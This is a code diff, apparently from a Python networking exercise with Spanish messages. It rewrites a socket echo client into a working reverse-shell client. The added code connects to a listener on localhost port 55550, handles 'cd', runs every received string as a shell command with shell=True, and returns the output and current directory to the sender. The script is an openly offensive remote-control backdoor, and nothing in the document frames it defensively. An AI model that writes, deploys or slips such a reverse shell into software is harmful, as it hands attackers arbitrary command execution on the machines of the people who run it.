@@ -1,30 +1,25 @@
 import socket
-import time
 import subprocess
-import sys
+import sys 
+import os
 
 host = "localhost"
-port = 40415
-
-try:
-    s=socket.socket()
-    s.connect((host,port))
-    while True:
-        datos = s.recv(2048)
-        if(datos[:4].decode("utf-8")=="quit"):
-            print("Se cerro la session remota.")
-            break
-        else:
-            strin = datos.decode("utf-8")
-            print("Nuevos datos llegaron: "+strin)
-            strin="Datos nuevos "+strin
-            time.sleep(1.2)
-            s.send(strin.encode(encoding="utf-8"))
-            
-    s.close()
+#port = 40415
+port = 55550
 
 
-except socket.error as err:
-    print("Error al iniciar el socket "+str(err))
+s=socket.socket()
+s.connect((host,port))
+while True:
+    datos = s.recv(2048)
+    if(datos[:2].decode("utf-8")=="cd"):
+        os.chdir(datos[3:].decode("utf-8"))
+    
+    if len(datos) > 0:
+        cmd = subprocess.Popen(datos[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read()+cmd.stderr.read()
+        output_str = str(output_byte,"utf-8") 
+        currentCWD = os.getcwd()+"> "
 
-
+        s.send(str.encode(output_str+currentCWD))
+        print(output_str)
